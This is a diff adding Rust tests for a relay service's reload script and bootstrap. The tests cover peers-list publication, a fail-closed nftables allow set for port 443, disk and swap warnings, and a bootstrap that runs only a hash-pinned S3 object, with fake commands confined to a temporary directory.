+            format!("{r}/proc/swaps"),
+            format!("{r}/swapfile"),
+        ])
     };
-    assert_eq!(runs, [run("aws", "systemctl", 60, ""), run("fake-aws", "fake-systemctl", 2, &root)], "without the root, then with it");
+    assert_eq!(
+        runs,
+        [run(["aws", "systemctl", "/usr/sbin/nft", "swapon"], 60, ""), run(["fake-aws", "fake-systemctl", "fake-nft", "fake-swapon"], 2, &root)],
+        "without the root, then with it"
+    );
+}
+
+/// I-T59 (R-93, R-96): `peers` is published as the other lists. PARAMETERS holds six names, `peers` among the lists and
+/// right before `tls`, which stays last; its value becomes live/peers.json byte for byte, 0640 (root:ai-env-relay on
+/// the instance; ownership is skipped when not root, I-R29), a new value one new file renamed over the old while the
+/// other files keep theirs, written before `fetched`; an absent value removes it (the run ok, the relay told), a value
+/// not JSON too (the run failed, naming it). reload.log is 0644 after a run under the unit's 077 umask, whether the run
+/// made it or an older reload left it 0600.
+#[test]
+fn the_reload_publishes_peers_as_the_other_lists() {
+    let params = reload_py_list("PARAMETERS");
+    assert_eq!((params.len(), params.last().map(String::as_str)), (6, Some("tls")), "{params:?}");
+    assert_eq!(params.iter().position(|p| p == "peers"), Some(4), "peers right before tls: {params:?}");
+    assert!(reload_py_list("LISTS").iter().any(|l| l == "peers"));
+
+    let mut w = World::new();
+    w.complete();
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert_eq!(text(&w.live("peers.json")), w.value("peers"));
+    assert_eq!(mode(&w.live("peers.json")), 0o640);
+    let log = w.root().join("var/log/ai-env-relay/reload.log");
+    assert_eq!(mode(&log), 0o644, "made by a run under the 077 umask");
+
+    // A new value: one new file, peers.json's alone; the relay told once.
+    let inode = |w: &World, f: &str| std::fs::metadata(w.live(f)).unwrap().ino();
+    let before: Vec<(&str, u64)> = PUBLISHED.iter().map(|(_, f)| (*f, inode(&w, f))).collect();
+    w.set("peers", &peers("203.0.113.7/32"));
+    std::fs::set_permissions(&log, std::fs::Permissions::from_mode(0o600)).unwrap();
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert!(ran.line.contains(" changed=peers absent=none "), "{}", ran.line);
+    assert_eq!(ran.systemctl, ["is-active ai-env-relay.service", "reload ai-env-relay.service"]);
+    assert_eq!((text(&w.live("peers.json")), mode(&w.live("peers.json"))), (w.value("peers"), 0o640));
+    for (f, ino) in before {
+        assert_eq!(inode(&w, f) != ino, f == "peers.json", "{f}: peers.json alone written again");
+    }
+    assert_eq!(mode(&log), 0o644, "an older reload's 0600 reload.log made 0644");
+
+    // Absent: removed, the run ok. Not JSON: removed, the run failed, naming it.
+    w.delete("peers");
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert!(!w.live("peers.json").exists() && ran.line.contains(" changed=peers absent=peers "), "{}", ran.line);
+    assert!(ran.systemctl.contains(&"reload ai-env-relay.service".to_string()), "{:?}", ran.systemctl);
+    w.set("peers", &peers("198.51.100.0/24"));
+    assert_eq!(w.run(&[]).code, 0);
+    assert!(w.live("peers.json").exists());
+    w.set("peers", "[{\"cidr\": \"198.51.100.0/24\",");
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert!(!w.live("peers.json").exists() && ran.line.contains(" why=peers: not JSON"), "{}", ran.line);
+
+    // One publication's writes, in order: the four lists, peers last of them, then tls.pem, and `fetched` after all.
+    let t = tempfile::tempdir().unwrap();
+    std::fs::create_dir_all(t.path().join("root/var/lib/ai-env-relay/live")).unwrap();
+    let values = json!({"artifact": null, "workers": placeholder(1), "grants": placeholder(2), "token-signers": placeholder(3), "peers": peers("198.51.100.0/24"), "tls": tls_pair("QUFB")});
+    let written = reload_module(
+        t.path(),
+        "written, real = [], m.write\n\
+         m.write = lambda run, path, data, mode, group: (written.append(os.path.basename(path)), real(run, path, data, mode, group))\n\
+         m.publish(m.Run({'AI_ENV_RELAY_ROOT': sys.argv[2]}), json.loads(sys.argv[3]))\n\
+         print(json.dumps(written))",
+        &[&t.path().join("root").display().to_string(), &values.to_string()],
+    );
+    let written: Vec<String> = serde_json::from_str(written.trim()).unwrap();
+    assert_eq!(written, ["workers.json", "grants.json", "token-signers.json", "peers.json", "tls.pem", "fetched"]);
+}
+
+/// I-T61 (R-95): a root volume over 90 % full (the runs' `statvfs` stub) puts `disk` first in the run line's `why=`
+/// list and does nothing more: with nothing else failed the run is `ok`, exits 0 and prunes (a binary beyond current
+/// and previous is removed); with a failure the list is `disk; <the failure>`, the run FAILED as the failure makes it.
+/// At 90 % and 89 % no `disk`. reload.log carries the word too (`relay status` reads it there, §RS.3.2 row 4).
+#[test]
+fn the_reload_says_why_disk() {
+    let mut w = World::new();
+    w.complete();
+    assert_eq!(w.run(&[]).code, 0);
+    let stale = w.libexec("ai-env-relay-00000000000000aa");
+    std::fs::write(&stale, b"an older relay").unwrap();
+    w.disk = 91;
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert!(ran.line.starts_with("ai-env-relay-reload: ok ") && ran.line.ends_with(" relay=active why=disk"), "{}", ran.line);
+    assert!(!stale.exists(), "pruned: disk fails nothing");
+    w.set("grants", "{");
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert!(ran.line.starts_with("ai-env-relay-reload: FAILED ") && ran.line.ends_with(" why=disk; grants: not JSON"), "{}", ran.line);
+    w.set("grants", &placeholder(2));
+    for used in [90, 89] {
+        w.disk = used;
+        let ran = w.run(&[]);
+        assert_eq!(ran.code, 0, "{}", ran.line);
+        assert!(!ran.line.contains(" why="), "{used} %: {}", ran.line);
+    }
+    let log = text(&w.root().join("var/log/ai-env-relay/reload.log"));
+    assert_eq!(log.lines().filter(|l| l.contains(" why=disk")).count(), 2, "{log}");
+}
+
+/// R-94's table with the set line `set`.
+fn peers_table(set: &str) -> String {
+    format!(
+        "table inet ai_env_relay_peers\ndelete table inet ai_env_relay_peers\ntable inet ai_env_relay_peers {{\n    {set}\n    chain input {{\n        type filter hook input priority filter; policy accept;\n        tcp dport 443 tcp flags & (syn | ack) == syn ip saddr != @allowed counter drop\n    }}\n}}\n"
+    )
+}
+
+/// R-94's set line of no entry: every SYN to 443 drops.
+const EMPTY_SET: &str = "set allowed { type ipv4_addr; flags interval; }";
+
+fn set_of(elements: &str) -> String {
+    format!("set allowed {{ type ipv4_addr; flags interval; elements = {{ {elements} }} }}")
+}
+
+/// I-T60 (R-94, LD-R54): after `publish` every run renders /etc/ai-env-relay/peers.nft (0644) and loads it with `nft -f`.
+/// Its elements are the networks of the entries in force, each truncated, sorted, a network inside another left out (a
+/// set with `flags interval` refuses it; a lapsed network holds nothing out). No entry in force, an absent value, one
+/// not JSON and one with a `cidr` or `not_after` R-86 refuses (a repeated network among them) render the empty set, so
+/// every SYN to 443 drops; a list the relay refuses for its label alone keeps its networks. The load runs on every run,
+/// changed or not (a reboot empties the kernel, not the file). A failed load adds `peers.nft: <nft's last Error line>` to
+/// `why=`, fails the run and stops nothing else. A failed fetch has nothing to publish or render, and is no absent value:
+/// the run loads the file as it is, the table a reboot emptied, and none if there is no file yet. A value nested past
+/// the parser's limit is one not JSON. Its size counts in the boot object, which has no limit (LD-R56), never in the user
+/// data (I-T8).
+#[test]
+fn the_peers_kernel_set_renders_fail_closed() {
+    const LATER: &str = "2099-12-31T23:59:59Z";
+    const LAPSED: &str = "2001-01-01T00:00:00Z";
+    let mut w = World::new();
+    w.complete();
+
+    // Two in force, a lapsed one; out of order, one with host bits.
+    w.set("peers", &peer_list(&[("203.0.113.7/32", LATER), ("192.0.2.0/24", LAPSED), ("198.51.100.77/24", LATER)]));
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    let file = w.peers_nft();
+    let want = peers_table(&set_of("198.51.100.0/24, 203.0.113.7/32"));
+    assert_eq!(text(&file), want, "R-94's text");
+    assert_eq!(mode(&file), 0o644);
+    assert_eq!(ran.nft, [format!("-f {}", file.display())], "one load of that file");
+    let t = w.t.path().to_path_buf();
+    assert_eq!(text(&t.join("nft.loaded")), want, "what nft was given");
+    assert_eq!(text(&t.join("nft.loaded.peers")), w.value("peers"), "after publish: live/peers.json already holds the value");
+    assert!(ran.systemctl.contains(&"restart ai-env-relay.service".to_string()), "{:?}", ran.systemctl);
+
+    // Every run loads, changed or not: a reboot empties the kernel's tables while the file survives. The mode comes back.
+    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
+    let again = w.run(&[]);
+    assert_eq!((again.code, again.nft.len(), text(&file)), (0, 1, want), "{}", again.line);
+    assert_eq!(mode(&file), 0o644);
+    assert!(again.line.contains(" changed=none "), "the relay is told nothing of it: {}", again.line);
+
+    // A network inside another is left out, whatever the order; a lapsed one holds nothing out; 0.0.0.0/0 is the one element.
+    for (entries, elements) in [
+        (vec![("203.0.113.7/32", LATER), ("203.0.113.0/24", LATER)], "203.0.113.0/24"),
+        (vec![("203.0.113.0/24", LATER), ("203.0.113.7/32", LATER), ("192.0.2.0/25", LATER), ("192.0.2.128/25", LATER)], "192.0.2.0/25, 192.0.2.128/25, 203.0.113.0/24"),
+        (vec![("203.0.113.0/24", LAPSED), ("203.0.113.7/32", LATER)], "203.0.113.7/32"),
+        (vec![("198.51.100.0/24", LATER), ("0.0.0.0/0", LATER), ("203.0.113.7/32", LATER)], "0.0.0.0/0"),
+    ] {
+        w.set("peers", &peer_list(&entries));
+        let ran = w.run(&[]);
+        assert_eq!(ran.code, 0, "{entries:?}: {}", ran.line);
+        assert_eq!(text(&file), peers_table(&set_of(elements)), "{entries:?}");
+    }
+
+    // The empty set: no entry in force, [], absent, not JSON, a bad cidr beside a good one, a repeated network.
+    let empty = peers_table(EMPTY_SET);
+    let good = ("198.51.100.0/24", LATER);
+    for (what, value, code) in [
+        ("all lapsed", Some(peer_list(&[("198.51.100.0/24", LAPSED)])), 0),
+        ("[]", Some("[]".to_string()), 0),
+        ("absent", None, 0),
+        ("not JSON", Some("[{\"cidr\": \"198.51.100.0/24\",".to_string()), 1),
+        // The other two values publish removes: the relay has no list then, and its own check says no_peers.
+        ("over 4096 bytes", Some(json!([{"cidr": "198.51.100.0/24", "label": "x".repeat(4096), "not_after": LATER}]).to_string()), 1),
+        ("not printable ASCII", Some(json!([{"cidr": "198.51.100.0/24", "label": "caf\u{e9}", "not_after": LATER}]).to_string()), 1),
+        ("a bad cidr", Some(peer_list(&[good, ("203.0.113.0/33", LATER)])), 0),
+        ("a bad not_after", Some(peer_list(&[good, ("203.0.113.0/24", "2099-02-30T00:00:00Z")])), 0),
+        ("a repeated network", Some(peer_list(&[good, ("198.51.100.7/24", LATER)])), 0),
+    ] {
+        w.set("peers", &peers("192.0.2.0/24"));
+        assert_eq!(w.run(&[]).code, 0);
+        assert_eq!(text(&file), peers_table(&set_of("192.0.2.0/24")));
+        match &value {
+            Some(v) => w.set("peers", v),
+            None => w.delete("peers"),
+        }
+        let ran = w.run(&[]);
+        assert_eq!(ran.code, code, "{what}: {}", ran.line);
+        assert_eq!(text(&file), empty, "{what}: every SYN to 443 drops");
+        assert_eq!(ran.nft.len(), 1, "{what}: loaded all the same");
+    }
+
+    // A list nested past the parser's limit fits in 4096 bytes: at AL2023's Python (3.9, as the Mac's) a RecursionError,
+    // no ValueError. The run still ends in its one line (World::run), with the empty set, whatever its Python makes of it.
+    let deep = format!("{}{}", "[".repeat(2000), "]".repeat(2000));
+    w.set("peers", &deep);
+    let ran = w.run(&[]);
+    assert_eq!((text(&file), ran.nft.len()), (empty.clone(), 1), "{}", ran.line);
+    assert!(ran.line.contains(" fetched=") && !ran.line.contains(" fetched=none"), "{}", ran.line);
+    w.set("artifact", &deep);
+    let ran = w.run(&[]);
+    assert_eq!((ran.code, ran.nft.len()), (1, 1), "{}", ran.line);
+    w.complete();
+
+    // R-86's refusals, one by one, as the relay's own parser takes them (policy::parse_peers), and what is no refusal of
+    // a cidr or a not_after.
+    let entry = |cidr: Value, not_after: Value| json!([{"cidr": "198.51.100.0/24", "label": "good", "not_after": LATER}, {"cidr": cidr, "label": "other", "not_after": not_after}]).to_string();
+    let mut refused: Vec<String> = vec![];
+    for cidr in ["203.0.113.0/33", "203.0.113.0", "203.0.113.300/24", "203.0.113.01/24", "203.0.113.0/024", "2001:db8::/32", "example.invalid/24", "203.0.113.0/", "/24", "203.0.113.0/2\u{0664}", "\u{0662}03.0.113.0/24", " 203.0.113.0/24"] {
+        refused.push(entry(json!(cidr), json!(LATER)));
+    }
+    for not_after in ["2099-13-01T00:00:00Z", "2099-02-30T00:00:00Z", "2099-12-31T24:00:00Z", "2099-12-31T23:60:00Z", "2099-12-31T23:59:60Z", "2099-12-31 23:59:59Z", "2099-12-31T23:59:59", "1969-12-31T23:59:59Z", "0000-01-01T00:00:00Z", "2099-12-31T23:59:5\u{0669}Z", "2099-12-31T23:59:59+00:00"] {
+        refused.push(entry(json!("203.0.113.0/24"), json!(not_after)));
+    }
+    refused.extend([entry(json!(5), json!(LATER)), entry(json!(null), json!(LATER)), entry(json!(["203.0.113.0/24"]), json!(LATER)), entry(json!("203.0.113.0/24"), json!(0))]);
+    refused.extend(["{}", "null", "5", "\"198.51.100.0/24\"", "[5]", "[[]]", "[{\"label\": \"x\", \"not_after\": \"2099-12-31T23:59:59Z\"}]", "[{\"cidr\": \"203.0.113.0/24\", \"label\": \"x\"}]"].map(String::from));
+    let bad_label = json!([{"cidr": "203.0.113.0/24", "label": "no spaces here", "not_after": LATER}, {"cidr": "198.51.100.0/24", "label": "good", "not_after": LATER}]).to_string();
+    // What R-86 takes, the reload takes, to the same networks: the edges of a date and of a network; the earliest date lapsed.
+    let taken = peer_list(&[("255.255.255.255/32", LATER), ("203.0.113.200/25", "2096-02-29T23:59:59Z"), ("198.51.100.0/24", "1970-01-01T00:00:00Z"), ("0.0.0.0/32", LATER)]);
+    let values = Value::Array(refused.iter().map(|v| json!(v)).collect()).to_string();
+    let module = tempfile::tempdir().unwrap();
+    let got = reload_module(
+        module.path(),
+        "for v in json.loads(sys.argv[2]) + sys.argv[3:]:\n    print(json.dumps(list(map(str, m.networks(v)))))",
+        &[&values, &taken, &bad_label],
+    );
+    let got: Vec<Value> = got.lines().map(|l| serde_json::from_str(l).unwrap()).collect();
+    let parsed = ai_env_worker::policy::parse_peers(&taken).expect("R-86 takes it");
+    let mut in_force: Vec<_> = parsed.iter().filter(|p| now() <= p.not_after_unix()).map(|p| p.network()).collect();
+    in_force.sort();
+    assert_eq!(got[got.len() - 2], json!(in_force.iter().map(|(a, n)| format!("{a}/{n}")).collect::<Vec<_>>()), "the relay's own networks of it");
+    assert_eq!(got[got.len() - 2], json!(["0.0.0.0/32", "203.0.113.128/25", "255.255.255.255/32"]));
+    for (value, networks) in refused.iter().zip(&got) {
+        assert_eq!(networks, &json!([]), "{value}");
+        if value.contains("\"other\"") {
+            assert!(ai_env_worker::policy::parse_peers(value).is_err(), "R-86 takes what the reload refuses: {value}");
+        }
+    }
+    assert_eq!(got.last(), Some(&json!(["198.51.100.0/24", "203.0.113.0/24"])), "a list the relay refuses for a label alone keeps its networks: the relay then says no_peers");
+    assert!(ai_env_worker::policy::parse_peers(&bad_label).is_err(), "the label is one R-86 refuses");
+    // The words of a value nested past the limit, on any Python: each of the three parses takes it for one not JSON.
+    let nested = reload_module(
+        module.path(),
+        "def deep(*args, **kwargs):\n    raise RecursionError('maximum recursion depth exceeded')\njson.loads = deep\nprint(m.invalid('peers', '[]'), '|', m.artifact_of('{}')[1], '|', m.networks('[]'))",
+        &[],
+    );
+    assert_eq!(nested.trim(), "not JSON | not JSON | []");
+
+    // A failed load: nft's Error line in `why=` (no value: its next line quotes the file), the run failed and not cut
+    // short, the file rendered; nft says the kernel keeps the table it had.
+    w.set("peers", &peer_list(&[("203.0.113.0/24", LATER)]));
+    let stale = w.libexec("ai-env-relay-00000000000000aa");
+    std::fs::write(&stale, b"an older relay").unwrap();
+    let ran = w.run(&[("FAKE_NFT_FAIL", "1")]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    let said = format!("peers.nft: {}:4:81-95: Error: conflicting intervals specified", file.display());
+    assert!(ran.line.starts_with("ai-env-relay-reload: FAILED ") && ran.line.ends_with(&format!(" relay=active why={said}")), "{}", ran.line);
+    assert!(!ran.line.contains("203.0.113"), "never a value: {}", ran.line);
+    assert_eq!(ran.nft.len(), 1, "one load, one failure");
+    assert_eq!(text(&file), peers_table(&set_of("203.0.113.0/24")));
+    assert!(ran.systemctl.contains(&"reload ai-env-relay.service".to_string()), "the relay is told of the new list all the same: {:?}", ran.systemctl);
+    assert!(stale.exists(), "a failed run prunes nothing");
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "the next run loads again: {}", ran.line);
+    assert_eq!((ran.nft.len(), stale.exists()), (1, false));
+
+    // nft cannot run: named, the run goes on.
+    let ran = w.run(&[("AI_ENV_RELAY_NFT", "/nonexistent/nft")]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert!(ran.line.contains(" relay=active why=peers.nft: cannot run /nonexistent/nft: No such file or directory"), "{}", ran.line);
+
+    // The file cannot be written: named, nothing loaded, and the relay still comes up: the kernel set never stops it.
+    let etc = w.root().join("etc/ai-env-relay");
+    std::fs::remove_dir_all(&etc).unwrap();
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert!(ran.line.contains(" relay=active why=peers.nft: No such file or directory"), "{}", ran.line);
+    assert!(ran.nft.is_empty(), "{:?}", ran.nft);
+    std::fs::create_dir_all(&etc).unwrap();
+
+    // A failed fetch publishes nothing and renders nothing, and is no absent value: the file as it is goes back in, the
+    // table a reboot emptied. A failed load of it is said after the fetch's failure. No file yet: nothing to load.
+    assert_eq!(w.run(&[]).code, 0);
+    let before = text(&file);
+    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert_eq!((ran.nft.as_slice(), text(&file)), (std::slice::from_ref(&format!("-f {}", file.display())), before.clone()));
+    assert_eq!(text(&t.join("nft.loaded")), before, "what nft was given");
+    assert!(ran.line.contains(" why=get-parameters: ") && !ran.line.contains("peers.nft"), "{}", ran.line);
+    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters"), ("FAKE_NFT_FAIL", "1")]);
+    assert_eq!((ran.code, ran.nft.len(), text(&file)), (1, 1, before), "{}", ran.line);
+    assert!(ran.line.contains(" why=get-parameters: ") && ran.line.ends_with(&format!("; {said}")), "{}", ran.line);
+    std::fs::remove_file(&file).unwrap();
+    let ran = w.run(&[("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert!(ran.nft.is_empty() && !file.exists() && !ran.line.contains("peers.nft"), "{:?} {}", ran.nft, ran.line);
+}
+
+/// I-T63 (LD-R57): every run reads /proc/swaps. /swapfile listed: nothing more. Not listed: `swapon /swapfile`, and with
+/// that nothing more is said. Still off: `swap` joins `why=` after `disk`, before the failures: no failure, no exit code,
+/// the prune goes on. The run whose fetch fails reads it too; a /proc/swaps that cannot be read counts as off; another
+/// file listed is not /swapfile.
+#[test]
+fn the_reload_keeps_the_swap_on() {
+    let mut w = World::new();
+    w.complete();
+    let (swaps, swapfile) = (w.root().join("proc/swaps"), w.root().join("swapfile").display().to_string());
+    let listed = format!("{SWAPS_HEADER}{swapfile} file 524284 0 -2\n");
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert!(ran.swapon.is_empty() && !ran.line.contains(" why="), "on: nothing more: {:?} {}", ran.swapon, ran.line);
+
+    // Off, and turned on again.
+    std::fs::write(&swaps, SWAPS_HEADER).unwrap();
+    let ran = w.run(&[]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert_eq!(ran.swapon, std::slice::from_ref(&swapfile), "swapon /swapfile");
+    assert!(!ran.line.contains(" why="), "{}", ran.line);
+    assert_eq!(text(&swaps), listed);
+    assert!(w.run(&[]).swapon.is_empty(), "on again: nothing more");
+
+    // Off, and it stays off: said, and nothing fails.
+    let stale = w.libexec("ai-env-relay-00000000000000aa");
+    std::fs::write(&stale, b"an older relay").unwrap();
+    std::fs::write(&swaps, SWAPS_HEADER).unwrap();
+    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
+    assert_eq!(ran.code, 0, "not a failure: {}", ran.line);
+    assert_eq!(ran.swapon.len(), 1);
+    assert!(ran.line.starts_with("ai-env-relay-reload: ok ") && ran.line.ends_with(" relay=active why=swap"), "{}", ran.line);
+    assert!(!stale.exists(), "pruned: swap fails nothing");
+    assert!(text(&w.root().join("var/log/ai-env-relay/reload.log")).lines().last().is_some_and(|l| l.ends_with(" why=swap")), "`make relay-logs` reads it there");
+
+    // After `disk`, before the failures.
+    w.disk = 91;
+    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
+    assert_eq!(ran.code, 0, "{}", ran.line);
+    assert!(ran.line.ends_with(" why=disk; swap"), "{}", ran.line);
+    w.set("grants", "{");
+    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
+    assert_eq!(ran.code, 1, "{}", ran.line);
+    assert!(ran.line.starts_with("ai-env-relay-reload: FAILED ") && ran.line.ends_with(" why=disk; swap; grants: not JSON"), "{}", ran.line);
+    w.disk = 50;
+    w.set("grants", &placeholder(2));
+
+    // Every run: one whose fetch fails too.
+    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1"), ("FAKE_AWS_FAIL_OP", "ssm get-parameters")]);
+    assert_eq!((ran.code, ran.swapon.len()), (1, 1), "{}", ran.line);
+    assert!(ran.line.contains(" why=swap; get-parameters: "), "{}", ran.line);
+
+    // Unreadable, or another file listed: off.
+    std::fs::remove_file(&swaps).unwrap();
+    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
+    assert_eq!((ran.code, ran.swapon.len()), (0, 1), "{}", ran.line);
+    assert!(ran.line.ends_with(" why=swap"), "{}", ran.line);
+    std::fs::write(&swaps, format!("{SWAPS_HEADER}{swapfile}.new file 524284 0 -2\n/dev/nvme0n1p9 partition 524284 0 -3\n")).unwrap();
+    let ran = w.run(&[("FAKE_SWAPON_FAIL", "1")]);
+    assert_eq!(ran.swapon.len(), 1, "{}", ran.line);
+    assert!(ran.line.ends_with(" why=swap"), "{}", ran.line);
+}
+
+/// Every absolute path `script` names outside `sys`: a `/` that no path character precedes (so at any boundary, a `^` or a
+/// `{` as well as a space or a quote) and the path characters after it. The two URLs' schemes are not paths, and a key's
+/// `relay/…` is no absolute path.
+fn absolute_paths(script: &str, sys: &str) -> std::collections::BTreeSet<String> {
+    let in_path = |c: char| c.is_ascii_alphanumeric() || "._-/".contains(c);
+    let scanned: Vec<char> = script.replace(sys, "SYS").replace("https://", "").replace("s3://", "").chars().collect();
+    (0..scanned.len())
+        .filter(|&i| scanned[i] == '/' && (i == 0 || !in_path(scanned[i - 1])))
+        .map(|i| scanned[i..].iter().copied().take_while(|c| in_path(*c)).collect::<String>())
+        .collect()
+}
+
+/// The first script's world (I-T64): the rendered user data with `/swapfile`, `/etc/fstab` and `/root` under a temporary
+/// directory, run by `/bin/bash` with a PATH that finds these fakes first: dd, mkswap and swapon (a list of files in
+/// `swaps`), aws (`FAKE_AWS_FAILS` failures, then `object` copied to its last argument), sleep and date (a clock in a
+/// file that only sleep moves), timeout (runs the rest) and sha256sum (the Mac has none on this PATH). Each logs to
+/// `calls`. It never touches the Mac's real paths: [`Bootstrap::new`] refuses a script that names a system path it knows
+/// nothing of, and boot.sh is never what runs: the object is the test's.
+struct Bootstrap {
+    t: tempfile::TempDir,
+    /// The object the user data pins.
+    pinned: String,
+    script: PathBuf,
+}
+
+impl Bootstrap {
+    const FAKES: [(&'static str, &'static str); 8] = [
+        ("dd", "#!/bin/sh\necho \"dd $*\" >> \"$W/calls\"\nfor a in \"$@\"; do case $a in of=*) : > \"${a#of=}\" ;; esac; done\n"),
+        ("mkswap", "#!/bin/sh\necho \"mkswap $*\" >> \"$W/calls\"\n"),
+        ("swapon", "#!/bin/sh\necho \"swapon $*\" >> \"$W/calls\"\ncase $1 in --show*) cat \"$W/swaps\" 2> /dev/null; exit 0 ;; esac\necho \"$1\" >> \"$W/swaps\"\n"),
+        (
+            "aws",
+            "#!/bin/sh\necho \"aws $*\" >> \"$W/calls\"\nn=$(cat \"$W/aws.count\" 2> /dev/null || echo 0); n=$((n + 1)); echo \"$n\" > \"$W/aws.count\"\nif [ \"$n\" -le \"${FAKE_AWS_FAILS:-0}\" ]; then echo 'Could not connect to the endpoint URL' >&2; exit 255; fi\nfor out in \"$@\"; do :; done\ncat \"$W/object\" > \"$out\"\necho '{\"ContentLength\": 1}'\n",
+        ),
+        ("sleep", "#!/bin/sh\necho \"sleep $*\" >> \"$W/calls\"\necho $(($(cat \"$W/clock\") + $1)) > \"$W/clock\"\n"),
+        ("date", "#!/bin/sh\ncat \"$W/clock\"\n"),
+        ("timeout", "#!/bin/sh\necho \"timeout $1\" >> \"$W/calls\"\nshift\nexec \"$@\"\n"),
+        ("sha256sum", "#!/bin/sh\nexec /usr/bin/python3 -I -c 'import hashlib, sys; print(hashlib.sha256(open(sys.argv[1], \"rb\").read()).hexdigest() + \"  \" + sys.argv[1])' \"$1\"\n"),
+    ];
+
+    /// The user data rendered for the object `pinned` (whose key and hash the test computes as relay-spec.ts does: I-T65
+    /// holds those to the boot script's text), its paths rewritten, the fakes in place.
+    fn new(pinned: &str) -> Bootstrap {
+        let t = tempfile::tempdir().unwrap();
+        let w = t.path().canonicalize().unwrap();
+        let sha = hex::encode(Sha256::digest(pinned.as_bytes()));
+        let rendered = node(
+            "console.log(JSON.stringify(rs.renderRelayUserData(process.env.RT_BUCKET, { bootKey: process.env.RT_KEY, bootSha256: process.env.RT_SHA }, 'eu-central-1', path.join(infra, 'relay'))));",
+            &[("RT_BUCKET", BUCKET), ("RT_KEY", &format!("relay/ai-env-relay-boot-{}", &sha[..16])), ("RT_SHA", &sha)],
+        );
+        let sys = w.join("sys").display().to_string();
+        let script = rendered.as_str().unwrap().replace("/root/", &format!("{sys}/root/")).replace("/swapfile", &format!("{sys}/swapfile")).replace("/etc/fstab", &format!("{sys}/etc/fstab"));
+        // Every absolute path left is one it may name for real: /bin/bash runs it, /dev/null takes output, and /dev/zero
+        // is an argument of the fake dd, which never opens it.
+        assert_eq!(absolute_paths(&script, &sys), ["/bin/bash", "/dev/null", "/dev/zero"].map(String::from).into(), "a system path this test does not rewrite:\n{script}");
+        for d in ["sys/root", "sys/etc", "bin"] {
+            std::fs::create_dir_all(w.join(d)).unwrap();
+        }
+        for (name, body) in Self::FAKES {
+            executable(&w.join("bin").join(name), body);
+        }
+        std::fs::write(w.join("sys/etc/fstab"), "UUID=0000 / xfs defaults 0 1\n").unwrap();
+        std::fs::write(w.join("clock"), "1700000000\n").unwrap();
+        let path = w.join("user-data.sh");
+        std::fs::write(&path, script).unwrap();
+        Bootstrap { t, pinned: pinned.to_string(), script: path }
+    }
+
+    fn w(&self) -> PathBuf {
+        self.t.path().canonicalize().unwrap()
+    }
+
+    /// One run with `object` in the bucket, under the umask cloud-init gives it; (exit code, stderr).
+    fn run(&self, object: &str, aws_fails: u32) -> (i32, String) {
+        let w = self.w();
+        std::fs::write(w.join("object"), object).unwrap();
+        let _ = std::fs::remove_file(w.join("aws.count"));
+        let mut cmd = Command::new("/bin/sh");
+        isolate(&mut cmd, &w);
+        cmd.arg("-c")
+            .arg("umask 022; exec /bin/bash \"$0\"")
+            .arg(&self.script)
+            .env("PATH", format!("{}:/usr/bin:/bin", w.join("bin").display()))
+            .env("W", &w)
+            .env("FAKE_AWS_FAILS", aws_fails.to_string());
+        let o = bounded(&mut cmd, "the user data");
+        (o.status.code().unwrap_or(-1), stderr(&o))
+    }
+
+    /// The calls logged so far.
+    fn calls(&self) -> Vec<String> {
+        text(&self.w().join("calls")).lines().map(str::to_string).collect()
+    }
+
+    fn marker(&self) -> String {
+        text(&self.w().join("marker"))
+    }
+
+    /// `key` of the object it pins.
+    fn key(&self) -> String {
+        format!("relay/ai-env-relay-boot-{}", &hex::encode(Sha256::digest(self.pinned.as_bytes()))[..16])
+    }
+}
+
+/// I-T64 (LD-R56): the rendered user data under bash, its system paths in a temporary directory. The right object runs
+/// (a marker, by `/bin/bash`, under the umask the script was given, its exit code the script's), after the swap steps,
+/// through one `aws s3api get-object` in reload.py's form. A wrong one stops with a nonzero exit, its reason on stderr, and
+/// no marker. A fetch failing twice then succeeding runs, 10 s apart. One failing throughout stops after about 5
+/// minutes of the fake clock, with no marker, and a file an earlier run left is not what runs. A second run is safe
+/// (I-R26): no second dd or swapon, one fstab line.
+#[test]
+fn the_bootstrap_runs_only_the_object_it_pinned() {
+    // The test's own object, never boot.sh: `$W` comes from the environment, so its text and its pin are one in every world.
+    let right = "umask >> \"$W/marker\"\necho ran >> \"$W/marker\"\n";
+    let b = Bootstrap::new(right);
+    let w = b.w();
+    let (code, err) = b.run(right, 0);
+    assert_eq!((code, err.as_str()), (0, ""), "the right object");
+    assert_eq!(b.marker(), "0022\nran\n", "it ran, under the umask the script was given (boot.sh's files keep their modes)");
+    let sys = w.join("sys").display().to_string();
+    let get = format!(
+        "aws s3api get-object --bucket {BUCKET} --key {} --region eu-central-1 --endpoint-url https://s3.eu-central-1.amazonaws.com {sys}/root/ai-env-relay-boot.sh",
+        b.key()
+    );
+    assert_eq!(
+        b.calls(),
+        [
+            format!("dd if=/dev/zero of={sys}/swapfile.new bs=1M count=512 status=none"),
+            format!("mkswap {sys}/swapfile.new"),
